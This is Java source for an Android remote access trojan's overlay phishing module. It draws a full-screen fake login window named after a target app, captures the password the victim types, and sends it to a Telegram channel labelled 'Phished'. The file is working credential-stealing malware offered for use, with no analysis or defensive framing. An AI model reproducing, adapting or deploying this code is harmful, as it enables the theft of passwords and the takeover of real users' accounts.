package com.enterprise.rat.commands;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.enterprise.rat.utils.TelegramApi;

public class OverlayPhishingManager {
    private Context context;
    private ViewGroup overlayView;
    private WindowManager wm;

    public OverlayPhishingManager(Context context) { this.context = context; }

    public void showOverlay(String appName, String message) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.CENTER;

                LinearLayout layout = new LinearLayout(context);
                layout.setOrientation(LinearLayout.VERTICAL);
                layout.setBackgroundColor(Color.WHITE);
                layout.setGravity(Gravity.CENTER);
                layout.setPadding(40, 40, 40, 40);

                TextView title = new TextView(context);
                title.setText(appName); title.setTextSize(22); title.setTextColor(Color.BLACK);
                layout.addView(title);

                TextView desc = new TextView(context);
                desc.setText(message); desc.setTextSize(14); desc.setTextColor(Color.GRAY);
                desc.setPadding(10, 10, 10, 20);
                layout.addView(desc);

                EditText input = new EditText(context);
                input.setHint("Password"); input.setInputType(InputType.TYPE_TEXT_VARIATION_PASSWORD);
                layout.addView(input);

                Button btn = new Button(context);
                btn.setText("Submit"); btn.setBackgroundColor(Color.parseColor("#4CAF50"));
                btn.setOnClickListener(v -> {
                    TelegramApi.sendMessage("🎣 Phished [" + appName + "]: " + input.getText().toString());
                    if (overlayView != null) wm.removeView(overlayView);
                });
                layout.addView(btn);

                overlayView = layout;
                wm.addView(overlayView, params);
                TelegramApi.sendMessage("🎣 Overlay phishing launched: " + appName);
            } catch (Exception e) { TelegramApi.sendMessage("❌ Overlay error: " + e.getMessage()); }
        });
    }

    public void removeOverlay() {
        if (overlayView != null && wm != null) {
            try { wm.removeView(overlayView); overlayView = null; } catch (Exception e) {}
        }
    }
}
